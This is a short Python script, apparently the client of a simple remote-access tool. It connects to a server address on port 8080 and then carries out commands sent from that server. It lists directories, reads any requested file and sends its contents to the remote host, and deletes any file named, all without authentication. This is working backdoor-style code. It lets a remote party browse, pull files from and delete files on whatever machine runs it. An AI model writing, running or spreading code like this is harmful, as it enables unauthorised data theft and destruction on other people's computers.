#command List
#view_cwd -will show all the files in the directory where the file is located
#custom_dir -will show files from the custom directory
#download_files -will show files from the directory


import os
import socket

s=socket.socket()
port=8080
#for automatic connections we can just enter the ip address of the server 
host=(input("please enter the server address :"))
s.connect((host,port))

print("Connected to Server successfully ")



#Connection has been completed



#command recieving and execution
while 1:
    command=s.recv(1024)
    command=command.decode()
    print("Command received")
    if command == "view_cwd":
        files=os.getcwd()
        files=str(files)
        s.send(files.encode())
        print("command has been executed successfully... ")
    elif command == "custom_dir":
        user_input=s.recv(5000)
        user_input=user_input.decode()
        files=os.listdir(user_input)
        files=str(files)
        s.send(files.encode())
        print("command has been executed successfully")
    elif command == "download_file":
        filepath=s.recv(5000)
        filepath=filepath.decode()
        file=open(filepath,"rb")
        data=file.read()
        s.send(data)
        print("file has been sent successfully")
    elif command == "remove_file":
        file_path=s.recv(6000)
        file_path=file_path.decode()
        os.remove(file_path)
        print("command has been executed successfully")
        

    else:
        print("Command not recognized")  